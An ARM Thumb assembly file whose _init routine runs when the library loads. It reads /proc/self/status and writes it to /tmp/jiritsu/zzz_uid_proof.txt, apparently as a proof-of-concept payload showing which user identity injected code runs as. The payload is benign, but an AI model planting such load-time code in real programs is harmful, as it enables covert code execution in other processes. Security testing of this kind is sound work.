    .syntax unified
    .thumb
    .text
    .global _init
    .type _init, %function
_init:
    push {r4, r5, r6, lr}
    sub  sp, #0x800
    mov  r6, sp
    @ open("/proc/self/status", O_RDONLY)
    movs r7, #5
    adr  r0, p_stat
    movs r1, #0
    movs r2, #0
    svc  #0
    mov  r4, r0
    cmp  r4, #0
    blt  done
    @ read(fd, sp, 0x800)
    movs r7, #3
    mov  r0, r4
    mov  r1, r6
    movw r2, #0x800
    svc  #0
    mov  r5, r0
    @ close(status fd)
    movs r7, #6
    mov  r0, r4
    svc  #0
    cmp  r5, #0
    ble  done
    @ open("/tmp/jiritsu/zzz_uid_proof.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    movs r7, #5
    adr  r0, p_out
    movw r1, #0x241
    movw r2, #0x1a4
    svc  #0
    mov  r4, r0
    cmp  r4, #0
    blt  done
    @ write(fd, buf, n)
    movs r7, #4
    mov  r0, r4
    mov  r1, r6
    mov  r2, r5
    svc  #0
    @ close(out fd)
    movs r7, #6
    mov  r0, r4
    svc  #0
done:
    add  sp, #0x800
    pop  {r4, r5, r6, pc}
    .balign 4
p_stat:
    .ascii "/proc/self/status\0"
    .balign 4
p_out:
    .ascii "/tmp/jiritsu/zzz_uid_proof.txt\0"
    .balign 4
